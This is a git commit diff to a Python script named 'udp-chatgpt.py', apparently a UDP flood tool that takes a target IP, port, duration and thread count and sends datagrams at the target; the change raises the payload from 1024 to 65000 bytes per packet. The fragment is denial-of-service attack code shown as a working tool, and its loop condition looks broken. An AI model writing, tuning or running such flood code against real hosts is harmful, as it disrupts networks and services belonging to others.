9abc76fb15c22bfe87d53a5b6879e2ab9d80ab95
Pulse <72387902+cintagram@users.noreply.github.com>
2023-03-18 21:30:04 +0900

    Update udp-chatgpt.py

--- udp-chatgpt.py
+++ udp-chatgpt.py
@@ -9,7 +9,7 @@ thread = int(sys.argv[4])
 def start():
     target_ip = target # Replace with the target IP address
     target_port = port # Replace with the target port
-    bytes = 1024 # Generate random bytes
+    bytes = 65000 # Generate random bytes
     counter = 0
     while counter == tim1*10:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
